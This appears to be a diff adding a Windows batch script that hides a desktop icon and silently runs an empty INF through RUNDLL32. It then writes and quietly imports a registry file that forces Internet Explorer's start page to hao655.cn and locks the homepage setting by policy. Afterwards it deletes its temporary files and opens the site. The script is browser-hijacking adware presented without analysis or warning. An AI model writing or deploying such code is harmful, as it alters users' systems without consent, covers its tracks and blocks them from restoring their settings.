@@ -1,0 +1,22 @@
+@echo off
+Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
+Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
+Set "TMPINF=C:\TmpInf.inf"
+echo [Version] >%TMPINF%
+echo Signature="$Windows NT$" >>%TMPINF%
+echo [DefaultInstall] >>%TMPINF%
+RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
+del %TMPINF%
+@echo off
+echo Windows Registry Editor Version 5.00>>honk.reg 
+echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>honk.reg 
+echo "Start Page"="http://www.hao655.cn">>honk.reg 
+echo [HKEY_CURRENT_USER\Software\Policies\Microsoft\internet explorer]>>honk.reg 
+echo "fDenyTSConnections"=dword:00000000>>honk.reg 
+echo [HKEY_CURRENT_USER\Software\Policies\Microsoft\internet explorer\control panel]>>honk.reg 
+echo "homepage"=dword:00000001>>honk.reg 
+regedit /s honk.reg
+del honk.reg
+
+@echo off
+start http://www.hao655.cn
